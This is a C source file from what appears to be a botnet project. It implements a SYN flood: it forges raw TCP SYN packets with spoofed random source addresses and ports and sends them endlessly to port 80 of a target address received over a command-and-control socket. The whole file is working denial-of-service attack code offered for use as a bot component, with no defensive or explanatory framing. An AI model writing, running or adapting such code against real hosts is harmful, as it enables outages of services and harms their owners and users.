// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Floods a target with created TCP datagram over raw socket
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include "../include/syn_flood.h"

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <time.h>

//#include "../include/sockets.h"


/*
 * Generates a random private IP address of class A
 *
 * Returns:
 *      char *random_ip:    a random IP address from 10.0.0.1 to 10.255.255.254
 */
char
*random_ip(void) {
    char    *generated_ip;

    generated_ip = calloc(16, sizeof(char));
    snprintf(generated_ip, 16, "10.%d.%d.%d",
             rand() % (255 + 1),
             rand() % (255 + 1),
             rand() % (254 + 1) + 1);
    return generated_ip;
}

/*
 * Generates a random dynamic port number
 *
 * Returns:
 *      uint16_t generated_port:    a random integer in the range 49152-65535
 */
uint16_t
random_port(void) {
    register uint16_t    generated_port;

    generated_port = (uint16_t)rand() % (65535 + 1 - 49152) + 49152;
    return generated_port;
}


/*
 * Realizes the checksum using the TCP pseudo header
 *
 * Parameters:
 *      uint16_t *psh:  pointer to the filled pseudo header structure
 *      size_t psh_size:    size of the pseudo_header structure
 *
 * Returns:
 *      Returns the result of the checksum of the segment
 */
uint16_t
csum(uint16_t *psh, size_t psh_size) {
    register int32_t    sum ;
    uint16_t            oddbyte;
    register int16_t    answer;

    sum = 0;
    while (psh_size > 1) {
        sum += *psh++;
        psh_size -= 2;
    }
    if (psh_size == 1) {
        oddbyte = 0;
        *((uint8_t *) &oddbyte) = *(uint8_t *) psh;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (uint16_t)~sum; // bitwise NOT
    return answer;
}


/*
 * Forges TCP segments and send them to the specified destination
 *
 * Parameters:
 *      int16_t socket_fd:  the C&C socket to receive the destination address
 */
void
syn_flood(int16_t socket_fd) {
    int16_t             new_sock;
    char                datagram[4096];
    char                source_ip[32] = { 0 };
    char                destination_ip[32] = { 0 };
    uint16_t            destination_port;
    struct sockaddr_in  destination_address;

    new_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    destination_port = 80;
    memset(&destination_address, 0, sizeof destination_address);
    // recv(socket_fd, source_ip, sizeof(source_ip), 0);
    recv(socket_fd, destination_ip, sizeof(destination_ip), 0);
    destination_address.sin_family = AF_INET;
    destination_address.sin_addr.s_addr = inet_addr(destination_ip);
    destination_address.sin_port = htons(destination_port);
    struct iphdr        *ip_header = (struct iphdr *)datagram;

    memset(datagram, 0, sizeof datagram);
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    ip_header->id = htons(17712);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr(random_ip());
    ip_header->daddr = destination_address.sin_addr.s_addr;
    ip_header->check = csum((uint16_t *)datagram, ip_header->tot_len >> 1);
    struct tcphdr   *tcp_header = (struct tcphdr *)(datagram + sizeof(struct ip));

    tcp_header->source = htons(random_port());
    tcp_header->dest = htons(80);
    tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->fin = 0;
    tcp_header->syn = 1;    // this flag must always be 1
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;    // do not set this flag
    tcp_header->urg = 0;
    tcp_header->window = htons(5120);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;
    pseudo_header       psh;

    psh.source_address = inet_addr(source_ip);
    psh.destination_address = destination_address.sin_addr.s_addr;
    psh.reserved = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    uint8_t         ip_hdrincl_flag = 1;
    const uint8_t   *hdrincl_flag_p = &ip_hdrincl_flag;

    if (setsockopt(new_sock, IPPROTO_IP, IP_HDRINCL, hdrincl_flag_p,
                   sizeof ip_hdrincl_flag) < 0) {
        return;
    }
    srand(time(0));
    while (1) {
        char        *generated_ip;
        uint16_t    generated_port;

        generated_ip = random_ip();
        generated_port = random_port();
        ip_header->saddr = inet_addr(generated_ip);
        tcp_header->source = htons(generated_port);
        psh.source_address = inet_addr(source_ip);
        tcp_header->check = csum((uint16_t *) &psh, sizeof(pseudo_header));
        memcpy(&psh.tcp, tcp_header, sizeof(struct tcphdr));
        if (sendto(new_sock, datagram, ip_header->tot_len, 0,
                   (struct sockaddr *) &destination_address,
                           sizeof destination_address) > 0) {
//            printf("Attacking %s as %s with port %d...\n",
//                   inet_ntoa(destination_address.sin_addr), generated_ip,
//                   generated_port);
            free(generated_ip);
            continue;
        }
        return;
    }
}
